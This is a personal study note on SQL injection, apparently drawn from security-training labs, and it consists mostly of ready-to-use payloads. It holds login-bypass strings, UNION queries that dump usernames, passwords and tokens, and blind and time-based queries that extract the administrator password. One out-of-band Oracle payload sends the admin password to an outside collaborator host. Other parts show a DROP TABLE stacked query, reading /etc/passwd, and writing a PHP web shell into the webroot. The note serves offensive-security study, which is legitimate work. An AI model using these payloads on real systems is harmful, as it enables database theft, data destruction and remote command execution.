![[Pasted image 20230426232920.png]]

![[Pasted image 20230426233035.png]]


# SQL Query Logic
![[Pasted image 20221203171253.png]]

1)  ***OR*** Injection Payload
	In *Username* Input :-
	[Username]' ***OR*** '1'='1
Query Logic Becomes :-
![[Pasted image 20221203171707.png]]
	And Thus We Get **Access!**


2) ***--*** Comment Payload
	In SQL, ***--*** Is Used To Start A Comment
	So, In Username Input :-
	[Username]' ***--***
Query Logic :-
	![[Pasted image 20221203172040.png]]
	And Thus We Get **Access!**


3) Comment Payload with Brackets **()**
```sql
' OR 1=1)--
' OR 1=1 in (SELECT password FROM users) -- -
```


---
# Types of SQL Injection

![[Pasted image 20230426233717.png]]


# In-Band SQL Injection
Occurs when the attacker uses the *same communication channel* to both *launch the attack & gather the result of the attack*.

**1) Error-Based SQL Injection**
![[Pasted image 20230426234254.png]]


**2) Union Based SQL Injection**
![[Pasted image 20230426234811.png]]

###### Exploiting Union Based SQLi
- Figure out the *number of columns* that the query is making
- Figure out the *data types of the columns*
- Use the UNION Operator to output information from the database


1) **ORDER BY**
![[Pasted image 20230427195529.png]]
```sql
1' ORDER BY 1-- 
OR
1 ORDER BY 1-- 
```

2) **NULL Values**
%%      Note: Application Might Return Actual Error Or Generic Error Message Or Return No Results             %%
![[Pasted image 20230427195903.png]]
```sql
1' UNION SELECT NULL-- 
OR
1 UNION SELECT NULL-- 
```


3) **Find Columns which hold String Data Type**
![[Pasted image 20230427200622.png]]

| Database Type    | Query                         |
| ---------------- | ----------------------------- |
| Microsoft, MySQL | SELECT @@version              |
| Oracle           | SELECT * FROM v@version, dual |
| PostgreSQL       | SELECT version()              |
-   The reason for using `NULL` as the values returned from the injected `SELECT` query is that the *data types in each column must be compatible between the original and the injected queries*. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.

-   On **Oracle**, every `SELECT` query must use the `FROM` keyword and *specify a valid table*. If your `UNION SELECT` *attack does not query from a table, you will still need to include* the `FROM` keyword *followed by a valid table name*. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:
    `' UNION SELECT NULL FROM DUAL--`

-   The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On **MySQL**, the *double-dash sequence must be followed by a space* `--%20`. Alternatively, the hash character `# %23` can be used to identify a comment.-


A UNION statement can only operate on SELECT statements with an equal number of columns. For example, if we attempt to UNION two queries that have results with a different number of columns, we get the following error:
```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

```sql
' UNION SELECT (SELECT oauth_token FROM oauth_tokens), NULL--
```

##### Retrieving multiple values within a single column
`' UNION SELECT username || ':' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `:` character.

---
# Blind SQL Injection
You Can't See the *Result of your attack*!

1) **Boolean Based Blind SQLi**
![[Pasted image 20230427191504.png]]


##### By Triggering Conditional Errors
If the *results of the SQL query are not returned*, and the *application does not respond any differently based on whether the query returns any rows*. But when the *SQL query causes an error*, then the *application returns a custom error message*.
Basically, we have to **create an error if the condition comes true**.

Example (**For Oracle**): `' UNION select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,1,1)='o'--`
Another Example: `SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1) > 'z') THEN TO_CHAR(1/0) ELSE NULL END FROM [table_name]`


##### SQL Query Limit
- To bypass this we use **Case Function**
```SQL
-- SQL Server
CAST((SELECT example_column FROM example_table) AS int)

-- PostgreSQL
CAST(version() AS numeric)
```

- If SQL Query exceeds the limit then remove the **Tracking ID** characters before '
- Use **AND/OR** Operator instead of UNION as *they require less space*
- If **OR/AND** requires a Boolean Expression Like this :-
![[Pasted image 20230603171214.png]]
Then Do this :-
```SQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```



2) **Time Based Blind SQLi**
![[Pasted image 20230427192230.png]]

- <u>Example Query</u>
```sql
' AND IF (1=1, sleep(3),'false') -- -
|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
|| (SELECT CASE WHEN (SELECT SUBSTRING(password, 2, 1) = 'l' FROM users WHERE username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```


In [[Website Hacking/Tools/Burp Suite/Basics]], go to #intruder --> Resource Pool --> Create New Resource Pool --> Maximum Concurrent Requests = 1
Then, during attack, Show the Response Recieved Column & *Look for Responses with long time*.


#### Out-of-Band SQL Injection
- Vulnerability that consists of *triggering an out-of-band network connection to a system that you control*.
	- Not Common
	- Variety of protocols can be used (Ex: DNS, HTTP)

Check Out SQLi Cheatsheet For More about this!

Note: For Oracle, Put your Entire SQL Query in that part *without changing the end, i.e, FROM dual*
Ex: `' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.qd7e45lso6vyn2qmqn8zhkxdd4jw7svh.oastify.com/"> %remote;]>'),'/l') FROM dual)--`


---
### Get the name of the Current Database

| Database Type | Query                              |
| ------------- | ---------------------------------- |
| MySQL         | SELECT DATABASE()                  |
| Oracle        | SELECT sys.database_name FROM dual |
| PostgreSQL    | SELECT current_database()          |

%% Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol. %%
### Listing Contents of Database
Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query `INFORMATION_SCHEMA.SCHEMATA` to list the names of databases present on the server:
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA

-- Union Query with group_concat in MySQL
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata-- -
```

You can query `INFORMATION_SCHEMA.TABLES` to list the tables in the database:

```sql
SELECT * FROM INFORMATION_SCHEMA.TABLES

-- Get specific table information from a specific database
SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[database_name]'

-- Union Query with group_concat in MySQL
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema='[database_name]' -- -

-- Union Query with array_agg in PostgreSQL
' UNION SELECT NULL, NULL, NULL, NULL, CAST((SELECT array_to_string(array_agg(table_name), ',') from information_schema.tables) AS integer), NULL, NULL, NULL--
```

You can then query `information_schema.columns` to list the columns in individual tables:

```sql
SELECT * FROM information_schema.columns WHERE table_name = '[table_name]'

-- Get specific information from columns
SELECT COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'

-- Union query with group_concat() in MySQL
' UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=..-- -
```

***Important Table Names :-***
1) TABLE_CATALOG 
2) TABLE_SCHEMA
3) **TABLE_NAME** 
4) **COLUMN_NAME**
5) DATA_TYPE

```sql
-- Dump Credentials from a database 
```

---
# More info on SQLi
For **PostgreSQL** & **MSSQL**, you can use `;` for multiple queries
```sql
SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;--'
```
Not possible with **MySQL**


```sql
-- Dump password of standard users in the table
UNION SELECT 1, user, password, authentication_string FROM mysql.user;

-- With group_concat()
test" UNION SELECT 1, gRoUp_cOncaT(0x7c,user,0x7C), gRoUp_cOncaT(0x7c,password,0x7C), gRoUp_cOncaT(0x7c,authentication_string,0x7C) FROM mysql.user;-- -
```

---
# File Reading/Writing
Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in `MySQL`, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.

<u>DB User</u>
First, we have to determine which user we are within the database. While we do not necessarily need **database administrator** (DBA) privileges to read data, this is becoming *more required in modern DBMSes*, as only DBA are given such privileges.
```sql
-- To be able to find our current DB user, we can use any of the following queries
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Our UNION injection payload will be as follows:
```sql
cn' UNION SELECT 1, user(), 3, 4-- 
-- OR
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```

Test for **Super admin privileges** :-
```sql
SELECT super_priv FROM mysql.user

-- Union Query
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user;-- 

-- If we had many users within the DBMS
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="[username]"-- -
```

![[Pasted image 20231006170123.jpg]]
The query returns **Y**, which means **YES**, indicating superuser privileges.

We can also dump other privileges we have directly from the schema, with the following query:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 

-- To only show current user priviliges
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
```
![[Pasted image 20231006170450.jpg]]

We see that the **FILE** privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.

### File Reading
```sql
SELECT LOAD_FILE('/etc/passwd');

-- Union Operator
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

### File Writing
The `secure_file_priv` variable is used to determine where to read/write files from. An **empty** value lets us *read files from the entire file system*. Otherwise, if a certain **directory is set**, we can only *read from the folder* specified by the variable. On the other hand, **NULL** means we *cannot read/write* from any directory.

| DBMS        | Default 'secure_file_priv' Setting |
| ----------- | ---------------------------------- |
| MariaDB     | Empty                              |
| MySQL       | /var/lib/mysql-files               |
| Modern DBMS | NULL                               |

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

-- UNION query
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
```

![[Pasted image 20231007151159.jpg]]
If results is **NULL**, we can read/write files to any location.

The `SELECT INTO OUTFILE` statement can be used to write data from *select queries into files*. This is usually used for exporting data from tables.
Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write file written successfully! to the `/var/www/html/proof.txt` file:
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

-- UNION query
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
%% Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like **Apache's** configuration found at `/etc/apache2/apache2.conf`, **Nginx's** configuration at `/etc/nginx/nginx.conf`, or **IIS** configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). %%

![[Pasted image 20231007152955.png]]

Thus, upload a PHP web shell
```php
<?php system($_REQUEST[0]); ?>
```
```sql
cn' UNION SELECT "",'<?php system($_REQUEST[0]);?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

This can be verified by browsing to the `/shell.php` file and executing commands via the **0** parameter, with `?0=id` in our URL:
![[Pasted image 20231007155610.png]]


---

***FOR SQLi Cheatsheet***, [SQL injection cheat sheet | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Wordlist for **Basic SQLi Payloads**:-
```
/usr/share/wfuzz/wordlist/vulns/sql_inj.txt
```

Or use this :-
```basicqueries
' OR 1=1--
' OR 1=1-- -
' OR 1=1#
' OR '1'='1'--
' OR '1'='1'-- -
' OR '1'='1'#
' OR '1'='1--
' OR '1'='1-- -
' OR '1'='1#
" OR 1=1--
" OR 1=1-- -
" OR 1=1#
') OR 1=1--
') OR 1=1-- -
') OR 1=1#
'; OR 1=1--
'; OR 1=1-- -
'; OR 1=1#
'OR '' = '
admin or 1=1--
admin or 1=1-- -
admin or 1=1#
```